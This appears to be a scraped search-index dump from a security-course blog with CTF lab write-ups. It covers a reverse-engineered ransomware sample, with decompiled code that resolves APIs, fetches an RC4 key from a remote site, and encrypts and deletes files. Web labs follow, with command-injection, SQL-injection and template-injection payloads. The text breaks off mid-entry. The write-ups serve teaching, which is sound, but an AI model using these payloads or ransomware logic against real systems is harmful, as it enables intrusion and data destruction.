DWORD *ResourceSize) { HRSRC result; // rax HRSRC hResInfo; // [rsp+30h] [rbp-10h] unsigned int i; // [rsp+3Ch] [rbp-4h] result = FindResourceA(0i64, (LPCSTR)\u0026#39;D\u0026#39;, (LPCSTR)0x84); hResInfo = result; if ( result ) { result = (HRSRC)LoadResource(0i64, result); if ( result ) { *pe_file = LockResource(result); result = (HRSRC)*pe_file; if ( *pe_file ) { *ResourceSize = SizeofResource(0i64, hResInfo); result = (HRSRC)*ResourceSize; // 0x1ca00 if ( (_DWORD)result ) { for ( i = 0; ; i += 2 ) { result = (HRSRC)*ResourceSize; if ( i \u0026gt;= (unsigned int)result ) break; *(_WORD *)((char *)*pe_file + (int)i) ^= 0x8711u; } } } } } return result; } ::: :::spoiler IDA\n:::\nRecon # 從source code上到下慢慢解析，這一題很難的地方在於很多東西都是runtime才決定的，包含embedded pe file，或者是一些function pointer，所以只能慢慢跟著動態去猜他的行為\nmain function中可以直接看到下面一點的地方，上面只是一些初始化，不用管他，真正在import embedded payload或是進行攻擊的地方在下面的NetworkConfig_1DBB\n說是network config其實和網路操作沒啥屁毛關係，只是前期分析的時候看到有InternetOpen相關的API就先這樣寫，再加上他給了一個https開頭的strings，但看了一圈其實只是scramble過後的payload再加上https，所以其實也和連線沒關係。簡單說一下這一段，詳細可以看一下前面MSDN的background，InternetOpenUrlA中帶的0x84000000，我看csdn分析WannaCry的文章表示，是INTERNET_FLAG_RELOAD + INTERNET_FLAG_NO_CACHE_WRITE的結果，也就是從server端拉資料下來，然後不會把結果存到cache中，但這一切我認為都是為了混淆reverse的人，因為InternetOpenUrl會對給予的szUrl進行連線，有成功的話才會進到if-statement，但他遠永不會成功，因為仔細看szUrl其實是http://M17H+G+4FzeJ69F5.*f)vfquhvnv)*fwdhud)*vf)lpktud)*lj)4)*uk)',27h,'Lpfwjvjcu)Rpkejrv)Tyehu'，所以直接分析下面的部分就好\n進到part 1的地方先看到一個for loop，那個就是在還原scramble url的部分，還原的結果是Microsoft Update，接著下面會把path combine在一起，並且創一個folder，並設定屬性為FILE_ATTRIBUTE_ARCHIVE + FILE_ATTRIBUTE_SYSTEM + FILE_ATTRIBUTE_HIDDEN，所以必須把file explorer的隱藏系統檔案的選項取消，才看得到 接著下面的nested if statement有點迷，基本上第一次執行一定會直接進到最後的else，因為基本上lpFilename剛創好空間，本身應該沒東西，所以MoveFile當然不會成功，接著就進到最後的ImportantPart了\n持續跟進會先進到NextStatePayload，這一段有個小地方可以注意，也就是(unsigned int)off_140007088()，這是個function pointer，主要做的事情就是isDebuggerPresent，所以如果有使用x64dbg的話要記得開Scylla Hide的Anti Anti Debugger，這樣才會進到if statement去取得embedded pe file(雖然就算不設定，第二個判斷式也應該會是true才對) 終於進到最關鍵的部分了，首先一開始遇到的function其實就是在還原embedded pe file，主要的操作是先取得resource$\\to$00007ff7f219b048 再藉由LoadResource取得真正的resource$\\to$00007ff7f219b058 然後取得該resource的大小$\\to$0x1ca00\n最重要的部分就是每兩個byte都進行XOR 0x8711的動作，直到0x1ca00都做完，這一部分就是解密embedded pe file，解密完可以很明顯看到MD這個magic signature 因此只要利用Scylla把這一部分的memory dump出來再拿去md5 file取得hash就可以了 Flag: FLAG{e6b77096375bcff4c8bc765e599fbbc0}\n"},{"id":427,"href":"/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x312023-hw---baby-ransom-2/","title":"Simple Reverse 0x31(2023 HW - Baby Ransom 2)","section":"Securities","content":" Simple Reverse 0x31(2023 HW - Baby Ransom 2) # Background # SystemFunction033 Source code # :::spoiler IDA WinMain\nint __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) { HWND hWnd; // [rsp+60h] [rbp-A8h] WNDCLASSW WndClass; // [rsp+70h] [rbp-98h] BYREF struct tagMSG Msg; // [rsp+C0h] [rbp-48h] BYREF memset(\u0026amp;WndClass, 0, sizeof(WndClass)); WndClass.lpfnWndProc = (WNDPROC)store_winword; WndClass.hInstance = hInstance; WndClass.lpszClassName = Caption; WndClass.hbrBackground = CreateSolidBrush(0); if ( !RegisterClassW(\u0026amp;WndClass) ) return 1; hWnd = CreateWindowExW(0, Caption, Caption, 0xCF0000u, 100, 100, 800, 600, 0i64, 0i64, hInstance, 0i64); if ( !hWnd ) return 2; MainPayload(); ShowWindow(hWnd, nShowCmd); memset(\u0026amp;Msg, 0, sizeof(Msg)); while ( GetMessageW(\u0026amp;Msg, 0i64, 0, 0) ) { TranslateMessage(\u0026amp;Msg); DispatchMessageW(\u0026amp;Msg); } return 0; } ::: :::spoiler IDA MainPayload\nvoid __stdcall MainPayload() { LoadLibraryA(LibFileName); LoadLibraryA(aWininetDll); if ( !(unsigned int)DynamicAPIResolution() ) DoSomethingBad(); } ::: :::spoiler IDA DynamicAPIResolution\n__int64 DynamicAPIResolution() { // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-\u0026#34;+\u0026#34; TO EXPAND] p_InLoadOrderModuleList = \u0026amp;NtCurrentPeb()-\u0026gt;Ldr-\u0026gt;InLoadOrderModuleList; for ( module = p_InLoadOrderModuleList; module-\u0026gt;InLoadOrderLinks.Flink != p_InLoadOrderModuleList; module = module-\u0026gt;InLoadOrderLinks.Flink ) { dll_name = module-\u0026gt;BaseDllName.Buffer; dll_base = module-\u0026gt;DllBase; if ( dll_name ) { if ( (*dll_name == \u0026#39;k\u0026#39; || *dll_name == \u0026#39;K\u0026#39;) \u0026amp;\u0026amp; (dll_name[1] == \u0026#39;e\u0026#39; || dll_name[1] == \u0026#39;E\u0026#39;) \u0026amp;\u0026amp; (dll_name[2] == \u0026#39;r\u0026#39; || dll_name[2] == \u0026#39;R\u0026#39;) \u0026amp;\u0026amp; (dll_name[3] == \u0026#39;n\u0026#39; || dll_name[3] == \u0026#39;N\u0026#39;) \u0026amp;\u0026amp; (dll_name[4] == \u0026#39;e\u0026#39; || dll_name[4] == \u0026#39;E\u0026#39;) \u0026amp;\u0026amp; (dll_name[5] == \u0026#39;l\u0026#39; || dll_name[5] == \u0026#39;L\u0026#39;) \u0026amp;\u0026amp; dll_name[6] == \u0026#39;3\u0026#39; \u0026amp;\u0026amp; dll_name[7] == \u0026#39;2\u0026#39; ) // import kernel32 library { exportTable = (dll_base + getNtHdrs(dll_base)-\u0026gt;OptionalHeader.DataDirectory[0].VirtualAddress); num_of_names = exportTable-\u0026gt;NumberOfNames; name_array = dll_base + exportTable-\u0026gt;AddressOfNames; name_ordinal = dll_base + exportTable-\u0026gt;AddressOfNameOrdinals; func_array = dll_base + exportTable-\u0026gt;AddressOfFunctions; for ( i = 0i64; i \u0026lt; num_of_names; ++i ) { api_name = (dll_base + *\u0026amp;func_array[4 * *\u0026amp;name_ordinal[2 * i]]); case_0 = search_case(dll_base + *\u0026amp;name_array[4 * i]); switch ( case_0 ) { case 0x69D265FE6B1C110Fi64: LoadLibraryA_0 = api_name; break; case 0x578960F1FC7FFF25i64: GetProcAddress = api_name; break; case 0xFA55E32C9D72A921i64: qword_140007A98 = api_name; break; case 0xE0746E00B47C0477i64: GetLastError = api_name; break; case 0xE7BDCAD1F3AE0E13i64: CreateDirectoryA = api_name; break; case 0x1C71D0537E2246F5i64: FindFirstFileA = api_name; break; case 0x121E523CBB49F938i64: FindNextFileA = api_name; break; case 0x1C8EF920B632E586i64: FindClose = api_name; break; case 0x28D0403A889E4F69i64: copyFileA = api_name; break; case 0x556A045B10DE85i64: CloseHandle = api_name; break; case 0x2E97865AB85128C3i64: ReadFile = api_name; break; case 0x2FA16C1D95E4306Ai64: WriteFile = api_name; break; case 0x5D35AEBEDFD88117i64: DeleteFileA = api_name; break; case 0xFC59546FD0D3D778i64: GetFileSize = api_name; break; case 0xEBC4E8E9B1542DEEi64: CreateFileA = api_name; break; } } } else if ( (*dll_name == \u0026#39;m\u0026#39; || *dll_name == \u0026#39;M\u0026#39;) \u0026amp;\u0026amp; (dll_name[1] == \u0026#39;s\u0026#39; || dll_name[1] == \u0026#39;S\u0026#39;) \u0026amp;\u0026amp; (dll_name[2] == \u0026#39;v\u0026#39; || dll_name[2] == \u0026#39;V\u0026#39;) \u0026amp;\u0026amp; (dll_name[3] == \u0026#39;c\u0026#39; || dll_name[3] == \u0026#39;C\u0026#39;) \u0026amp;\u0026amp; (dll_name[4] == \u0026#39;r\u0026#39; || dll_name[4] == \u0026#39;R\u0026#39;) \u0026amp;\u0026amp; (dll_name[5] == \u0026#39;t\u0026#39; || dll_name[5] == \u0026#39;T\u0026#39;) )// import msvcrt library { exportTable_1 = (dll_base + getNtHdrs(dll_base)-\u0026gt;OptionalHeader.DataDirectory[0].VirtualAddress); num_of_names_1 = exportTable_1-\u0026gt;NumberOfNames; name_array_1 = dll_base + exportTable_1-\u0026gt;AddressOfNames; name_ordinal_1 = dll_base + exportTable_1-\u0026gt;AddressOfNameOrdinals; func_array_1 = dll_base + exportTable_1-\u0026gt;AddressOfFunctions; for ( j = 0i64; j \u0026lt; num_of_names_1; ++j ) { api_name_1 = (dll_base + *\u0026amp;func_array_1[4 * *\u0026amp;name_ordinal_1[2 * j]]); case_1 = search_case(dll_base + *\u0026amp;name_array_1[4 * j]); switch ( case_1 ) { case 0x974ADB99DCFF7A24i64: qword_140007B08 = api_name_1; break; case 0xD9C0619DA0F59BADi64: malloc = api_name_1; break; case 0x2AB2847890E35C03i64: sprintf_s = api_name_1; break; } } } else if ( (*dll_name == \u0026#39;u\u0026#39; || *dll_name == \u0026#39;U\u0026#39;) \u0026amp;\u0026amp; (dll_name[1] == \u0026#39;s\u0026#39; || dll_name[1] == \u0026#39;S\u0026#39;) \u0026amp;\u0026amp; (dll_name[2] == \u0026#39;e\u0026#39; || dll_name[2] == \u0026#39;E\u0026#39;) \u0026amp;\u0026amp; (dll_name[3] == \u0026#39;r\u0026#39; || dll_name[3] == \u0026#39;R\u0026#39;) \u0026amp;\u0026amp; dll_name[4] == \u0026#39;3\u0026#39; \u0026amp;\u0026amp; dll_name[5] == \u0026#39;2\u0026#39; ) // import user32 library { exportTable_2 = (dll_base + getNtHdrs(dll_base)-\u0026gt;OptionalHeader.DataDirectory[0].VirtualAddress); num_of_names_2 = exportTable_2-\u0026gt;NumberOfNames; name_array_2 = dll_base + exportTable_2-\u0026gt;AddressOfNames; name_ordinal_2 = dll_base + exportTable_2-\u0026gt;AddressOfNameOrdinals; func_array_2 = dll_base + exportTable_2-\u0026gt;AddressOfFunctions; for ( k = 0i64; k \u0026lt; num_of_names_2; ++k ) { api_name_2 = dll_base + *\u0026amp;func_array_2[4 * *\u0026amp;name_ordinal_2[2 * k]]; if ( search_case(dll_base + *\u0026amp;name_array_2[4 * k]) == 0x1E307D27BA21DDA4i64 ) qword_140007A80 = api_name_2; } } else if ( (*dll_name == \u0026#39;w\u0026#39; || *dll_name == \u0026#39;W\u0026#39;) \u0026amp;\u0026amp; (dll_name[1] == \u0026#39;i\u0026#39; || dll_name[1] == \u0026#39;I\u0026#39;) \u0026amp;\u0026amp; (dll_name[2] == \u0026#39;n\u0026#39; || dll_name[2] == \u0026#39;N\u0026#39;) \u0026amp;\u0026amp; (dll_name[3] == \u0026#39;i\u0026#39; || dll_name[3] == \u0026#39;I\u0026#39;) \u0026amp;\u0026amp; (dll_name[4] == \u0026#39;n\u0026#39; || dll_name[4] == \u0026#39;N\u0026#39;) \u0026amp;\u0026amp; (dll_name[5] == \u0026#39;e\u0026#39; || dll_name[5] == \u0026#39;E\u0026#39;) \u0026amp;\u0026amp; (dll_name[6] == \u0026#39;t\u0026#39; || dll_name[6] == \u0026#39;T\u0026#39;) )// import wineinet library { exportTable_3 = (dll_base + getNtHdrs(dll_base)-\u0026gt;OptionalHeader.DataDirectory[0].VirtualAddress); num_of_names_3 = exportTable_3-\u0026gt;NumberOfNames; name_array_3 = dll_base + exportTable_3-\u0026gt;AddressOfNames; name_ordinal_3 = dll_base + exportTable_3-\u0026gt;AddressOfNameOrdinals; func_array_3 = dll_base + exportTable_3-\u0026gt;AddressOfFunctions; for ( m = 0i64; m \u0026lt; num_of_names_3; ++m ) { api_name_3 = (dll_base + *\u0026amp;func_array_3[4 * *\u0026amp;name_ordinal_3[2 * m]]); case_3 = search_case(dll_base + *\u0026amp;name_array_3[4 * m]); switch ( case_3 ) { case 0x8261F0DF5FDC0887i64: InternetOpenA = api_name_3; break; case 0xE726A35A86C7641Ci64: InternetOpenUrlA = api_name_3; break; case 0x6F4E79C87F04F3E6i64: InternetReadFile = api_name_3; break; case 0x2DF8494D5C13046i64: InternetCloseHandle = api_name_3; break; } } } } } return 0i64; } ::: :::spoiler IDA DoSomethingBad\nvoid __stdcall DoSomethingBad() { HMODULE LibraryA_0; // rax HANDLE FirstFileA; // [rsp+20h] [rbp-188h] const void *space; // [rsp+30h] [rbp-178h] BYREF DWORD fileSize; // [rsp+38h] [rbp-170h] BYREF struct _WIN32_FIND_DATAA lpFindFileData; // [rsp+40h] [rbp-168h] BYREF char folderName[24]; // [rsp+180h] [rbp-28h] BYREF strcpy(folderName, \u0026#34;Microsoft Update Backup\u0026#34;); if ( (CreateDirectoryA(folderName, 0i64) || GetLastError() == ERROR_ALREADY_EXISTS) \u0026amp;\u0026amp; !(unsigned int)InternetConnect() ) { LibraryA_0 = LoadLibraryA_0(aAdvapi32); SystemFunction032 = (__int64 (__fastcall *)(_QWORD, _QWORD))GetProcAddress(LibraryA_0, ProcName); FirstFileA = FindFirstFileA(FileName, \u0026amp;lpFindFileData); if ( FirstFileA != (HANDLE)-1i64 ) { do { space = 0i64; if ( (lpFindFileData.dwFileAttributes \u0026amp; FILE_ATTRIBUTE_DIRECTORY) == 0 \u0026amp;\u0026amp; !(unsigned int)Create_Read_File(lpFindFileData.cFileName, (LPVOID *)\u0026amp;space, \u0026amp;fileSize) ) { if ( (unsigned int)sprintf_copyFile(lpFindFileData.cFileName, folderName) ) Create_Write_Delete_File(lpFindFileData.cFileName, space, fileSize); } } while ( FindNextFileA(FirstFileA, \u0026amp;lpFindFileData) ); FindClose(FirstFileA); } } } ::: :::spoiler IDA InternetConnect\n__int64 InternetConnect() { unsigned int v1; // [rsp+30h] [rbp-38h] BOOL i; // [rsp+34h] [rbp-34h] _BYTE *lpBuffer; // [rsp+38h] [rbp-30h] HINTERNET hFile; // [rsp+40h] [rbp-28h] HINTERNET hInternet; // [rsp+48h] [rbp-20h] LPDWORD *lpdwNumberOfBytesRead; // [rsp+50h] [rbp-18h] BYREF lpBuffer = malloc(0x1000ui64); hInternet = InternetOpenA(szAgent, 1u, 0i64, 0i64, 0); if ( !hInternet ) return 1i64; hFile = InternetOpenUrlA(hInternet, szUrl, 0i64, 0, INTERNET_FLAG_RELOAD, 0i64); if ( hFile ) { v1 = 0; for ( i = InternetReadFile(hFile, lpBuffer, 0x1000u, \u0026amp;lpdwNumberOfBytesRead); i \u0026amp;\u0026amp; lpdwNumberOfBytesRead \u0026amp;\u0026amp; v1 \u0026lt; 0x1000; i = InternetReadFile(hFile, \u0026amp;lpBuffer[v1], 4096 - v1, \u0026amp;lpdwNumberOfBytesRead) ) { v1 += lpdwNumberOfBytesRead; } qword_140007460 = (lpBuffer + 2687); lpBuffer[2706] = 0; InternetCloseHandle(hFile); InternetCloseHandle(hInternet); return 0i64; } else { InternetCloseHandle(hInternet); return 2i64; } } ::: :::spoiler IDA Create_Read_File\n__int64 __fastcall Create_Read_File(LPCSTR lpFileName, LPVOID *space, DWORD *fileSize) { HANDLE hFile; // [rsp+40h] [rbp-128h] LPDWORD NumberOfBytesRead; // [rsp+48h] [rbp-120h] BYREF char v6; // [rsp+50h] [rbp-118h] BYREF hFile = CreateFileA(lpFileName, GENERIC_READ, 0, 0i64, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0i64); if ( hFile == (HANDLE)-1i64 ) return 1i64; *fileSize = GetFileSize(hFile, 0i64); sub_140002A40((int)\u0026amp;v6, 256, (int)aD, *fileSize); *space = malloc(*fileSize + 1i64); if ( *space ) { if ( ReadFile(hFile, *space, *fileSize, (LPDWORD)\u0026amp;NumberOfBytesRead, 0i64) ) { *((_BYTE *)*space + *fileSize) = 0; CloseHandle(hFile); } return 0i64; } else { CloseHandle(hFile); return 1i64; } } ::: :::spoiler IDA sprintf_copyFile\n__int64 __fastcall sprintf_copyFile(const char *FileName, const char *folderName) { char buffer[272]; // [rsp+30h] [rbp-128h] BYREF sprintf_s(buffer, 0x104ui64, \u0026#34;%s\\\\%s\u0026#34;, folderName, FileName);// FolderName =\u0026gt; Microsoft Update Backup // FileName =\u0026gt; baby-ransom.exe return copyFileA(FileName, buffer, 0i64); } ::: :::spoiler IDA Create_Write_Delete_File\nvoid __fastcall Create_Write_Delete_File(const char *fileName, const void *space, DWORD fileSize) { unsigned __int64 v3; // [rsp+40h] [rbp-178h] __int64 v4; // [rsp+48h] [rbp-170h] HANDLE hFile; // [rsp+50h] [rbp-168h] DWORD nNumberOfBytesToWrite; // [rsp+68h] [rbp-150h] BYREF LPCVOID lpBuffer; // [rsp+70h] [rbp-148h] const struct ustring *key; // [rsp+78h] [rbp-140h] BYREF __int64 v9; // [rsp+80h] [rbp-138h] DWORD NumberOfBytesWritten[2]; // [rsp+88h] [rbp-130h] BYREF char Buffer[272]; // [rsp+90h] [rbp-128h] BYREF v9 = qword_140007460; LODWORD(key) = 19; v3 = -1i64; do ++v3; while ( fileName[v3] ); // 這個do_while loop的結果是0xf，因為\u0026#34;baby-ransom.exe\u0026#34;總共15個字 if ( v3 \u0026lt;= 0x13 ) { v4 = -1i64; do ++v4; while ( fileName[v4] ); LODWORD(key) = v4; } lpBuffer = space; nNumberOfBytesToWrite = fileSize; SystemFunction032(\u0026amp;nNumberOfBytesToWrite, \u0026amp;key); sprintf_s(Buffer, 0x104ui64, \u0026#34;enc_%s\u0026#34;, fileName); hFile = CreateFileA(Buffer, 0x40000000u, 0, 0i64, 2u, 0x80u, 0i64); if ( hFile != (HANDLE)-1i64 ) { if ( WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, NumberOfBytesWritten, 0i64) ) DeleteFileA(fileName); CloseHandle(hFile); } } :::\nRecon # 這一題只要慢慢分析其實很簡單，也有很多是上課就有教到的地方，一樣從上到下(source code)\n首先，如果直接執行這個程式的話，過沒多久會跳出一個視窗，其他部分\u0026quot;好像\u0026quot;沒有甚麼特別攻擊的行為，從WinMain中可以大略知曉這些事情，也就是攻擊者事先決定好一個通知的視窗(就是要叫你付錢的視窗)的一些設定(包含顏色、字形、字體等等)，接著就進到MainPayload搞事 首先他先load msvcrt.dll和wininet.dll這兩個library，再用上課教的==Dynamic API Resolution==，把原本process上的kernel32.dll, msvcrt.dll和user32.dll也一併load到該thread，接著就進到==DoSomethingBad==這邊 從上到下就做幾件事情 創一個名叫Microsoft Update Backup的folder 進行網路連線 試圖連線https://shouldhavecat.com/robots.txt這個網站 如果連線成功就讀取該網站的內容 Load進SystemFunction032這個library$\\to$非常重要 找目前目錄的第一個檔案(不限檔案類型) 進到Create_Read_File 創一個file，名字和之前取得的檔案名稱一樣(假設爬到的file名稱是flag.txt，那新的file也是一樣的名字) malloc一個大小為該檔案大小的空間(假設flag.txt的大小是0x11，malloc的空間就是0x11) 讀flag.txt到這個malloc空間 進到sprintf_copyFile，就是把./flag.txt複製到./Microsoft Update Backup/flag.txt中 進到Create_Write_Delete_File，這是最重要的部分 計算RC4加密需要的key，這個就是從一開始從https://shouldhavecat.com/robots.txt讀取下來的內容中擷取一段8個bytes當作key 利用SystemFunction032把我們的檔案加密 創一個enc_flag.txt這個檔案然後把加密的cipher寫進去 加密的部分 從SystemFunction033這個網站可以知道SystemFunction033一開始的結構，我們可以順著這個結構去推敲解密需要的key struct ustring { DWORD Length; DWORD MaximumLength; PUCHAR Buffer; } _data, key; typedef NTSTATUS(WINAPI* _SystemFunction033)( struct ustring* memoryRegion, struct ustring* keyPointer ); 執行這行之前，跟一下他的資料結構，首先前4 bytes是代表大小，後4 bytes代表maximum length，後8 bytes代表該資料的pointer 第一個parameter就是要加密的檔案，大小就是0x11，儲存在0x214E5567710，所以要加密的明文是FLAG{test_134567} 第二個parameter就是加密所需要的key，大小是0x8，位置是0x324E556613F，所以加密所需的key是==2F 37 32 38 33 33 31 33== 既然已經知道所有的流程就直接使用線上工具解密即可 Exploit # 直接用online tool decrypt cipher\nCiphertext: 71 04 1F C7 93 1A 7C A0 E1 F5 08 44 D0 08 18 D7 1D E0 22 B5 A3 AD 3A C9 B2 D5 E7 40 41 4B 86 97 E8 2E 6B Key: 2F 37 32 38 33 33 31 33 Flag: FLAG{50_y0u_p4y_7h3_r4n50m?!hmmmmm}\nReference # "},{"id":428,"href":"/security/course/ntu-cs/web/simple-web---0x02lab---whois-tool/","title":"Simple Web - 0x02(Lab - Whois Tool)","section":"Securities","content":" Simple Web - 0x02(Lab - Whois Tool) # tags: CTF Web eductf # Challenge: https://whoistool.ctf.zoolab.org/\nBackground # Almost the same as 0x10(Lab - DNS Lookup Tool | WAF)\nSource Code # \u0026lt;?php if(isset($_GET[\u0026#34;host\u0026#34;])){ $host = $_GET[\u0026#34;host\u0026#34;]; if(strlen($host) \u0026gt; 15) echo \u0026#34;Host name tooooooo logn!!\u0026#34;; else echo `whois \u0026#34;{$host}\u0026#34; 2\u0026gt;\u0026amp;1;`; } ?\u0026gt; Exploit # Payload: \u0026quot;;ls -al;\u0026quot; Payload: \u0026quot;;cat flag.t*;\u0026quot; Then we got flag!!!\n"},{"id":429,"href":"/security/course/ntu-cs/web/simple-web---0x03lab---normal-login-panel-flag-1/","title":"Simple Web - 0x03(Lab - Normal Login Panel (Flag 1))","section":"Securities","content":" Simple Web - 0x03(Lab - Normal Login Panel (Flag 1)) # tags: CTF Web eductf # Challenge: https://login.ctf.zoolab.org/\nBackground # Source Code # Analysis # Exploit - SQLi # Easy way - SQLmap # $ ./sqlmap.py \u0026#34;https://login.ctf.zoolab.org/\u0026#34; --form -dbs sqlite --dump --risk=3 --level=5 ... --- Parameter: username (POST) Type: time-based blind Title: SQLite \u0026gt; 2.0 AND time-based blind (heavy query) Payload: username=\u0026#39;||(SELECT CHAR(116,86,90,89) WHERE 7681=7681 AND 7766=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))))||\u0026#39;\u0026amp;password= --- Hard way - try\u0026amp;error # Check if it has sqli problem Payload: union' Try union based Payload: admin' union select 1 -- → WRONG Payload: admin' union select 1,2 -- → WRONG Payload: admin' union select 1,2,3 -- → WRONG Payload: admin' union select 1,2,3,4 -- Obviously, it shows some info when select 4 values\nMust know the metadata According to the author, it used sqlite as its DBMS. As kaibro cheat sheet\n爆表名 SELECT name FROM sqlite_master WHERE type=\u0026lsquo;table\u0026rsquo;\nThen we can add this in our request Payload: admin' union select 1,2,3,sql FROM sqlite_master WHERE type='table' -- Based on the info we leak, there\u0026rsquo;s a table named users with id, username, password,and count 4 columns\nLeak password Payload: admin' union select 1,2,3,password FROM users -- Result # Then we got source code!!! :::spoiler code\nfrom flask import Flask, request, render_template, render_template_string, send_file from flask_sqlalchemy import SQLAlchemy db = SQLAlchemy() app = Flask(__name__) app.config[\u0026#34;SQLALCHEMY_DATABASE_URI\u0026#34;] = \u0026#34;sqlite:///app.db\u0026#34; db.init_app(app) with app.app_context(): db.session.execute(\u0026#34;\u0026#34;\u0026#34; CREATE TABLE IF NOT EXISTS users( id Integer PRIMARY KEY, username String NOT NULL UNIQUE, password String, count Integer DEFAULT 0 ); \u0026#34;\u0026#34;\u0026#34;) db.session.execute(\u0026#34;INSERT OR REPLACE INTO users (username, password) VALUES (\u0026#39;admin\u0026#39;, \u0026#39;FLAG{Un10N_s31eCt/**/F14g_fR0m_s3cr3t}\u0026#39;)\u0026#34;) db.session.commit() def login(greet): if not greet: return send_file(\u0026#39;app.py\u0026#39;, mimetype=\u0026#39;text/plain\u0026#39;) else: return render_template_string(f\u0026#34;Hello {greet}\u0026#34;) @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#34;GET\u0026#34;, \u0026#34;POST\u0026#34;]) def index(): if request.method == \u0026#34;GET\u0026#34;: return render_template(\u0026#39;index.html\u0026#39;) else: username = request.form.get(\u0026#39;username\u0026#39;, \u0026#39;\u0026#39;) password = request.form.get(\u0026#39;password\u0026#39;, \u0026#39;\u0026#39;) error = \u0026#39;\u0026#39; user = db.session.execute(\u0026#34;SELECT username, password FROM users where username=:username\u0026#34;, {\u0026#34;username\u0026#34;:username}).first() if user and user[1] == password: return login(request.form.get(\u0026#39;greet\u0026#39;, \u0026#39;\u0026#39;)) elif not user: error += \u0026#34;User doesn\u0026#39;t exist! \u0026#34; # New feature! count login failed event db.session.execute(\u0026#34;UPDATE users SET count = count + 1 WHERE username=:username\u0026#34;, {\u0026#34;username\u0026#34;: username}) db.session.commit() count = db.session.execute(f\u0026#34;SELECT * FROM users WHERE username=\u0026#39;{username}\u0026#39;\u0026#34;).first() or [0, 0, 0, 0] error += f\u0026#39;Login faild count: {count[3]}\u0026#39; return render_template(\u0026#39;index.html\u0026#39;, error=error) if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#34;0.0.0.0\u0026#34;) :::\n"},{"id":430,"href":"/security/course/ntu-cs/web/simple-web---0x04lab---normal-login-panel-flag-2/","title":"Simple Web - 0x04(Lab - Normal Login Panel (Flag 2))","section":"Securities","content":" Simple Web - 0x04(Lab - Normal Login Panel (Flag 2)) # tags: CTF Web eductf # Challenge: https://login.ctf.zoolab.org/\nBackground # Web Security 0x1\nSource Code # :::spoiler code\nfrom flask import Flask, request, render_template, render_template_string, send_file from flask_sqlalchemy import SQLAlchemy db = SQLAlchemy() app = Flask(__name__) app.config[\u0026#34;SQLALCHEMY_DATABASE_URI\u0026#34;] = \u0026#34;sqlite:///app.db\u0026#34; db.init_app(app) with app.app_context(): db.session.execute(\u0026#34;\u0026#34;\u0026#34; CREATE TABLE IF NOT EXISTS users( id Integer PRIMARY KEY, username String NOT NULL UNIQUE, password String, count Integer DEFAULT 0 ); \u0026#34;\u0026#34;\u0026#34;) db.session.execute(\u0026#34;INSERT OR REPLACE INTO users (username, password) VALUES (\u0026#39;admin\u0026#39;, \u0026#39;FLAG{Un10N_s31eCt/**/F14g_fR0m_s3cr3t}\u0026#39;)\u0026#34;) db.session.commit() def login(greet): if not greet: return send_file(\u0026#39;app.py\u0026#39;, mimetype=\u0026#39;text/plain\u0026#39;) else: return render_template_string(f\u0026#34;Hello {greet}\u0026#34;) @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#34;GET\u0026#34;, \u0026#34;POST\u0026#34;]) def index(): if request.method == \u0026#34;GET\u0026#34;: return render_template(\u0026#39;index.html\u0026#39;) else: username = request.form.get(\u0026#39;username\u0026#39;, \u0026#39;\u0026#39;) password = request.form.get(\u0026#39;password\u0026#39;, \u0026#39;\u0026#39;) error = \u0026#39;\u0026#39; user = db.session.execute(\u0026#34;SELECT username, password FROM users where username=:username\u0026#34;, {\u0026#34;username\u0026#34;:username}).first() if user and user[1] == password: return login(request.form.get(\u0026#39;greet\u0026#39;, \u0026#39;\u0026#39;)) elif not user: error += \u0026#34;User doesn\u0026#39;t exist! \u0026#34; # New feature! count login failed event db.session.execute(\u0026#34;UPDATE users SET count = count + 1 WHERE username=:username\u0026#34;, {\u0026#34;username\u0026#34;: username}) db.session.commit() count = db.session.execute(f\u0026#34;SELECT * FROM users WHERE username=\u0026#39;{username}\u0026#39;\u0026#34;).first() or [0, 0, 0, 0] error += f\u0026#39;Login faild count: {count[3]}\u0026#39; return render_template(\u0026#39;index.html\u0026#39;, error=error) if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#34;0.0.0.0\u0026#34;) :::\nAnalysis # Exploit - SSTI # Observe source code def login(greet): if not greet: return send_file(\u0026#39;app.py\u0026#39;, mimetype=\u0026#39;text/plain\u0026#39;) else: return render_template_string(f\u0026#34;Hello {greet}\u0026#34;) ... if user and user[1] == password: return login(request.form.get(\u0026#39;greet\u0026#39;, \u0026#39;\u0026#39;)) If we pass the login page, it\u0026rsquo;ll render greet parameter as template data. Obviously SSTI problem. Burp Suite It really has SSTI problem Payload: {{[].__class__}} → Output: \u0026lt;class 'list'\u0026gt; Payload: {{[].__class__.__base__}} → Output: \u0026lt;class 'object'\u0026gt; Payload: {{[].__class__.__base__.__subclasses__()}} → :::spoiler Output: Hello [\u0026lt;class \u0026#39;type\u0026#39;\u0026gt; \u0026lt;class \u0026#39;async_generator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;bytearray_iterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;bytearray\u0026#39;\u0026gt; \u0026lt;class \u0026#39;bytes_iterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;bytes\u0026#39;\u0026gt; \u0026lt;class \u0026#39;builtin_function_or_method\u0026#39;\u0026gt; \u0026lt;class \u0026#39;callable_iterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;PyCapsule\u0026#39;\u0026gt; \u0026lt;class \u0026#39;cell\u0026#39;\u0026gt; \u0026lt;class \u0026#39;classmethod_descriptor\u0026#39;\u0026gt; \u0026lt;class \u0026#39;classmethod\u0026#39;\u0026gt; \u0026lt;class \u0026#39;code\u0026#39;\u0026gt; \u0026lt;class \u0026#39;complex\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_contextvars.Token\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_contextvars.ContextVar\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_contextvars.Context\u0026#39;\u0026gt; \u0026lt;class \u0026#39;coroutine\u0026#39;\u0026gt; \u0026lt;class \u0026#39;dict_items\u0026#39;\u0026gt; \u0026lt;class 